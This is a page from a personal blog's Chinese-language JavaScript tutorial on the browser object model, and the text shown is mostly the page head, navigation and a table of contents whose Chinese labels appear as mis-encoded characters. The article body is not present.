<!DOCTYPE html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-beta.62" />
    <meta name="theme" content="VuePress Theme Hope" />
    <meta property="og:url" content="https://harryxiong24.github.io/zh/front-end/advanced-js/jses23.html"><meta property="og:site_name" content="Harry Xiong"><meta property="og:title" content="23.BOM"><meta property="og:description" content="æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿° ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³• ç½‘é¡µä¸­åµŒå…¥ JavaScript ä»£ç ï¼Œä¸»è¦æœ‰å››ç§æ–¹æ³•ï¼š å…ƒç´ ç›´æ¥åµŒå…¥ä»£ç ã€‚; æ ‡ç­¾åŠ è½½å¤–éƒ¨è„šæœ¬; äº‹ä»¶å±æ€§; URL åè®®; script å…ƒç´ åµŒå…¥ä»£ç  å…ƒç´ å†…éƒ¨å¯ä»¥ç›´æ¥å†™å…¥ JavaScript ä»£ç ã€‚ æ ‡ç­¾æœ‰ä¸€ä¸ªtypeå±æ€§ï¼Œç”¨æ¥æŒ‡å®šè„šæœ¬ç±»å‹ã€‚å¯¹ JavaScript è„šæœ¬æ¥è¯´ï¼Œtypeå±æ€§å¯ä»¥è®¾ä¸ºä¸¤ç§å€¼ã€‚ t..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2023-06-15T14:05:05.000Z"><meta property="article:author" content="Harry Xiong"><meta property="article:tag" content="JS è¿›é˜¶æ•™ç¨‹"><meta property="article:published_time" content="2021-08-01T00:00:00.000Z"><meta property="article:modified_time" content="2023-06-15T14:05:05.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"23.BOM","image":[""],"datePublished":"2021-08-01T00:00:00.000Z","dateModified":"2023-06-15T14:05:05.000Z","author":[{"@type":"Person","name":"Harry Xiong","url":"https://harryxiong24.github.io"}]}</script><meta name="baidu-site-verification" content="Osv8SVNDzm"><meta name="description" content="IT Blog"><meta name="keywords" content="IT, Blog, Internet, sharing, IT skill"><link rel="icon" href="/favicon.ico"><title>23.BOM | Harry Xiong</title>
    <style>
      :root {
        --bg-color: #fff;
      }

      html[data-theme="dark"] {
        --bg-color: #1d1e1f;
      }

      html,
      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <link rel="preload" href="/assets/style-6136a7ea.css" as="style"><link rel="stylesheet" href="/assets/style-6136a7ea.css">
    <link rel="modulepreload" href="/assets/app-79d257de.js"><link rel="modulepreload" href="/assets/jses23.html-7f1588c6.js"><link rel="modulepreload" href="/assets/plugin-vue_export-helper-c27b6911.js"><link rel="modulepreload" href="/assets/jses23.html-1426bdf9.js">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">è·³è‡³ä¸»è¦å…§å®¹</a><!--]--><!--[--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a href="/zh/" class="vp-brand"><img class="vp-nav-logo" src="/logo.png" alt="Harry Xiong"><!----><span class="vp-site-name hide-in-pad">Harry Xiong</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="nav-item hide-in-mobile"><a href="/zh/" class="nav-link" aria-label="ä¸»é¡µ"><span class="font-icon icon iconfont icon-home" style=""></span>ä¸»é¡µ<!----></a></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="å…³äºæˆ‘"><span class="title"><span class="font-icon icon iconfont icon-profile" style=""></span>å…³äºæˆ‘</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a href="/zh/about-me/intro.html" class="nav-link" aria-label="About Me"><span class="font-icon icon iconfont icon-info" style=""></span>About Me<!----></a></li><li class="dropdown-item"><a href="/zh/about-me/contact.html" class="nav-link" aria-label="è”ç³»æˆ‘"><span class="font-icon icon iconfont icon-community" style=""></span>è”ç³»æˆ‘<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="éšç¬”"><span class="title"><span class="font-icon icon iconfont icon-article" style=""></span>éšç¬”</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a href="/zh/poem" class="nav-link" aria-label="å†™åœ¨å‰é¢"><!---->å†™åœ¨å‰é¢<!----></a></li><li class="dropdown-item"><h4 class="dropdown-subtitle"><span>è¯—é›†</span></h4><ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/zh/poem/life" class="nav-link" aria-label="ç”Ÿå‘½ä¹‹æ­Œ"><!---->ç”Ÿå‘½ä¹‹æ­Œ<!----></a></li></ul></li></ul></button></div></div><div class="nav-item hide-in-mobile"><div class="dropdown-wrapper"><button type="button" class="dropdown-title" aria-label="å­¦ä¹ ç¬”è®°"><span class="title"><span class="font-icon icon iconfont icon-note" style=""></span>å­¦ä¹ ç¬”è®°</span><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a href="/zh/front-end" class="nav-link active" aria-label="Web å‰ç«¯"><span class="font-icon icon iconfont icon-code" style=""></span>Web å‰ç«¯<!----></a></li><li class="dropdown-item"><a href="/zh/back-end" class="nav-link" aria-label="Web åå°"><span class="font-icon icon iconfont icon-software" style=""></span>Web åå°<!----></a></li><li class="dropdown-item"><a href="/zh/computer-basic" class="nav-link" aria-label="è®¡ç®—æœºåŸºç¡€ç³»åˆ—"><span class="font-icon icon iconfont icon-computer" style=""></span>è®¡ç®—æœºåŸºç¡€ç³»åˆ—<!----></a></li><li class="dropdown-item"><a href="/zh/python" class="nav-link" aria-label="Python"><span class="font-icon icon iconfont icon-python" style=""></span>Python<!----></a></li><li class="dropdown-item"><a href="/zh/markdown/markdown.html" class="nav-link" aria-label="Markdown"><span class="font-icon icon iconfont icon-markdown" style=""></span>Markdown<!----></a></li><li class="dropdown-item"><a href="/zh/git" class="nav-link" aria-label="Git"><span class="font-icon icon iconfont icon-git" style=""></span>Git<!----></a></li><li class="dropdown-item"><a href="/zh/vscode" class="nav-link" aria-label="VSCode"><span class="font-icon icon iconfont icon-vscode" style=""></span>VSCode<!----></a></li></ul></button></div></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><div class="nav-item"><div class="dropdown-wrapper i18n-dropdown"><button type="button" class="dropdown-title" aria-label="é€‰æ‹©è¯­è¨€"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon i18n-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="i18n icon" style="width:1rem;height:1rem;vertical-align:middle;"><path d="M379.392 460.8 494.08 575.488l-42.496 102.4L307.2 532.48 138.24 701.44l-71.68-72.704L234.496 460.8l-45.056-45.056c-27.136-27.136-51.2-66.56-66.56-108.544h112.64c7.68 14.336 16.896 27.136 26.112 35.84l45.568 46.08 45.056-45.056C382.976 312.32 409.6 247.808 409.6 204.8H0V102.4h256V0h102.4v102.4h256v102.4H512c0 70.144-37.888 161.28-87.04 210.944L378.88 460.8zM576 870.4 512 1024H409.6l256-614.4H768l256 614.4H921.6l-64-153.6H576zM618.496 768h196.608L716.8 532.48 618.496 768z"></path></svg><!--]--><span class="arrow"></span><ul class="nav-dropdown"><li class="dropdown-item"><a href="/" class="nav-link" aria-label="English"><!---->English<!----></a></li><li class="dropdown-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html" class="router-link-active router-link-exact-active nav-link active" aria-label="ç®€ä½“ä¸­æ–‡"><!---->ç®€ä½“ä¸­æ–‡<!----></a></li></ul></button></div></div><div class="nav-item hide-in-mobile"><button type="button" class="outlook-button" tabindex="-1" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" class="icon outlook-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="outlook icon"><path d="M224 800c0 9.6 3.2 44.8 6.4 54.4 6.4 48-48 76.8-48 76.8s80 41.6 147.2 0 134.4-134.4 38.4-195.2c-22.4-12.8-41.6-19.2-57.6-19.2C259.2 716.8 227.2 761.6 224 800zM560 675.2l-32 51.2c-51.2 51.2-83.2 32-83.2 32 25.6 67.2 0 112-12.8 128 25.6 6.4 51.2 9.6 80 9.6 54.4 0 102.4-9.6 150.4-32l0 0c3.2 0 3.2-3.2 3.2-3.2 22.4-16 12.8-35.2 6.4-44.8-9.6-12.8-12.8-25.6-12.8-41.6 0-54.4 60.8-99.2 137.6-99.2 6.4 0 12.8 0 22.4 0 12.8 0 38.4 9.6 48-25.6 0-3.2 0-3.2 3.2-6.4 0-3.2 3.2-6.4 3.2-6.4 6.4-16 6.4-16 6.4-19.2 9.6-35.2 16-73.6 16-115.2 0-105.6-41.6-198.4-108.8-268.8C704 396.8 560 675.2 560 675.2zM224 419.2c0-28.8 22.4-51.2 51.2-51.2 28.8 0 51.2 22.4 51.2 51.2 0 28.8-22.4 51.2-51.2 51.2C246.4 470.4 224 448 224 419.2zM320 284.8c0-22.4 19.2-41.6 41.6-41.6 22.4 0 41.6 19.2 41.6 41.6 0 22.4-19.2 41.6-41.6 41.6C339.2 326.4 320 307.2 320 284.8zM457.6 208c0-12.8 12.8-25.6 25.6-25.6 12.8 0 25.6 12.8 25.6 25.6 0 12.8-12.8 25.6-25.6 25.6C470.4 233.6 457.6 220.8 457.6 208zM128 505.6C128 592 153.6 672 201.6 736c28.8-60.8 112-60.8 124.8-60.8-16-51.2 16-99.2 16-99.2l316.8-422.4c-48-19.2-99.2-32-150.4-32C297.6 118.4 128 291.2 128 505.6zM764.8 86.4c-22.4 19.2-390.4 518.4-390.4 518.4-22.4 28.8-12.8 76.8 22.4 99.2l9.6 6.4c35.2 22.4 80 12.8 99.2-25.6 0 0 6.4-12.8 9.6-19.2 54.4-105.6 275.2-524.8 288-553.6 6.4-19.2-3.2-32-19.2-32C777.6 76.8 771.2 80 764.8 86.4z"></path></svg><div class="outlook-dropdown"><!----></div></button></div><div class="nav-item vp-repo"><a class="vp-repo-link" href="https://github.com/HarryXiong24/HarryXiong24.github.io" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><section class="vp-sidebar-group"><p class="vp-sidebar-heading active"><span class="font-icon icon iconfont icon-js" style=""></span><span class="vp-sidebar-title">JS &amp; ESè¿›é˜¶æ•™ç¨‹</span><!----></p><ul class="vp-sidebar-links"><li><!--[--><a href="/zh/front-end/advanced-js/" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="1.åºè¨€"><span class="font-icon icon iconfont icon-js" style=""></span>1.åºè¨€<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses2.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="2.åŸºç¡€å…³æ³¨ç‚¹"><span class="font-icon icon iconfont icon-js" style=""></span>2.åŸºç¡€å…³æ³¨ç‚¹<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses3.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="3.æ•°æ®ç±»å‹çš„æ£€éªŒå’Œè½¬æ¢"><span class="font-icon icon iconfont icon-js" style=""></span>3.æ•°æ®ç±»å‹çš„æ£€éªŒå’Œè½¬æ¢<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses4.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="4.é”™è¯¯å¤„ç†æœºåˆ¶"><span class="font-icon icon iconfont icon-js" style=""></span>4.é”™è¯¯å¤„ç†æœºåˆ¶<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses5.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="5.Array"><span class="font-icon icon iconfont icon-js" style=""></span>5.Array<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses6.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="6.String"><span class="font-icon icon iconfont icon-js" style=""></span>6.String<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses7.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="7.Object"><span class="font-icon icon iconfont icon-js" style=""></span>7.Object<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses8.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="8.Class"><span class="font-icon icon iconfont icon-js" style=""></span>8.Class<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses9.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="9.Symbol"><span class="font-icon icon iconfont icon-js" style=""></span>9.Symbol<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses10.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="10.è§£æ„èµ‹å€¼"><span class="font-icon icon iconfont icon-js" style=""></span>10.è§£æ„èµ‹å€¼<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses11.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="11.æ–°å¢è¿ç®—ç¬¦"><span class="font-icon icon iconfont icon-js" style=""></span>11.æ–°å¢è¿ç®—ç¬¦<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses12.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="12.å¼‚æ­¥ç¼–ç¨‹"><span class="font-icon icon iconfont icon-js" style=""></span>12.å¼‚æ­¥ç¼–ç¨‹<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses13.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="13.Set"><span class="font-icon icon iconfont icon-js" style=""></span>13.Set<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses14.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="14.Map"><span class="font-icon icon iconfont icon-js" style=""></span>14.Map<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses15.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="15.Iterator"><span class="font-icon icon iconfont icon-js" style=""></span>15.Iterator<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses16.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="16.å¼‚æ­¥éå†å™¨"><span class="font-icon icon iconfont icon-js" style=""></span>16.å¼‚æ­¥éå†å™¨<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses17.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="17.Proxy"><span class="font-icon icon iconfont icon-js" style=""></span>17.Proxy<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses18.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="18.Reflect"><span class="font-icon icon iconfont icon-js" style=""></span>18.Reflect<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses19.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="19.Moduleæ¨¡å—åŒ–"><span class="font-icon icon iconfont icon-js" style=""></span>19.Moduleæ¨¡å—åŒ–<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses20.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="20.æ¨¡å—åŠ è½½çš„å®ç°"><span class="font-icon icon iconfont icon-js" style=""></span>20.æ¨¡å—åŠ è½½çš„å®ç°<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses21.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="21.DOM"><span class="font-icon icon iconfont icon-js" style=""></span>21.DOM<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses22.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="22.DOMäº‹ä»¶"><span class="font-icon icon iconfont icon-js" style=""></span>22.DOMäº‹ä»¶<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html" class="router-link-active router-link-exact-active nav-link active vp-sidebar-link vp-sidebar-page active" aria-label="23.BOM"><span class="font-icon icon iconfont icon-js" style=""></span>23.BOM<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°"><!---->æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•"><!---->ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#äº‹ä»¶å±æ€§" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="äº‹ä»¶å±æ€§"><!---->äº‹ä»¶å±æ€§<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#url-åè®®" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="URL åè®®"><!---->URL åè®®<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#script-å…ƒç´ " class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="script å…ƒç´ "><!---->script å…ƒç´ <!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æµè§ˆå™¨çš„ç»„æˆ" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="æµè§ˆå™¨çš„ç»„æˆ"><!---->æµè§ˆå™¨çš„ç»„æˆ<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-å¯¹è±¡" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Window å¯¹è±¡"><!---->Window å¯¹è±¡<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æ¦‚è¿°" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="æ¦‚è¿°"><!---->æ¦‚è¿°<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-å¯¹è±¡çš„å±æ€§" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="window å¯¹è±¡çš„å±æ€§"><!---->window å¯¹è±¡çš„å±æ€§<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-å¯¹è±¡çš„æ–¹æ³•" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="window å¯¹è±¡çš„æ–¹æ³•"><!---->window å¯¹è±¡çš„æ–¹æ³•<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-getselection" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="window.getSelection()"><!---->window.getSelection()<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#äº‹ä»¶" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="äº‹ä»¶"><!---->äº‹ä»¶<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#å¤šçª—å£æ“ä½œ" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="å¤šçª—å£æ“ä½œ"><!---->å¤šçª—å£æ“ä½œ<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-å¯¹è±¡ä¸-screen-å¯¹è±¡" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Navigator å¯¹è±¡ä¸ Screen å¯¹è±¡"><!---->Navigator å¯¹è±¡ä¸ Screen å¯¹è±¡<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-å¯¹è±¡çš„å±æ€§" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Navigator å¯¹è±¡çš„å±æ€§"><!---->Navigator å¯¹è±¡çš„å±æ€§<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-å¯¹è±¡çš„æ–¹æ³•" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Navigator å¯¹è±¡çš„æ–¹æ³•"><!---->Navigator å¯¹è±¡çš„æ–¹æ³•<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-çš„å®éªŒæ€§å±æ€§" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Navigator çš„å®éªŒæ€§å±æ€§"><!---->Navigator çš„å®éªŒæ€§å±æ€§<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#screen-å¯¹è±¡" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Screen å¯¹è±¡"><!---->Screen å¯¹è±¡<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Cookie"><!---->Cookie<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æ¦‚è¿°-1" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="æ¦‚è¿°"><!---->æ¦‚è¿°<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie-ä¸-http-åè®®" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Cookie ä¸ HTTP åè®®"><!---->Cookie ä¸ HTTP åè®®<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie-çš„å±æ€§" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Cookie çš„å±æ€§"><!---->Cookie çš„å±æ€§<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#document-cookie" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="document.cookie"><!---->document.cookie<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#åŒæºé™åˆ¶" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="åŒæºé™åˆ¶"><!---->åŒæºé™åˆ¶<!----></a><ul class="vp-sidebar-sub-headers"><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æ¦‚è¿°-2" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="æ¦‚è¿°"><!---->æ¦‚è¿°<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie-1" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="Cookie"><!---->Cookie<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#iframe-å’Œå¤šçª—å£é€šä¿¡" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="iframe å’Œå¤šçª—å£é€šä¿¡"><!---->iframe å’Œå¤šçª—å£é€šä¿¡<!----></a><ul class="vp-sidebar-sub-headers"></ul></li><li class="vp-sidebar-sub-header"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#ajax" class="router-link-active router-link-exact-active nav-link vp-sidebar-link vp-heading" aria-label="AJAX"><!---->AJAX<!----></a><ul class="vp-sidebar-sub-headers"></ul></li></ul></li></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses24.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="24.ç¼–ç¨‹é£æ ¼"><span class="font-icon icon iconfont icon-js" style=""></span>24.ç¼–ç¨‹é£æ ¼<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses25.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="25.æ­£åˆ™è¡¨è¾¾å¼"><span class="font-icon icon iconfont icon-js" style=""></span>25.æ­£åˆ™è¡¨è¾¾å¼<!----></a><ul class="vp-sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/zh/front-end/advanced-js/jses26.html" class="nav-link vp-sidebar-link vp-sidebar-page" aria-label="26.æ ‡å‡†å¯¹è±¡åº“"><span class="font-icon icon iconfont icon-js" style=""></span>26.æ ‡å‡†å¯¹è±¡åº“<!----></a><ul 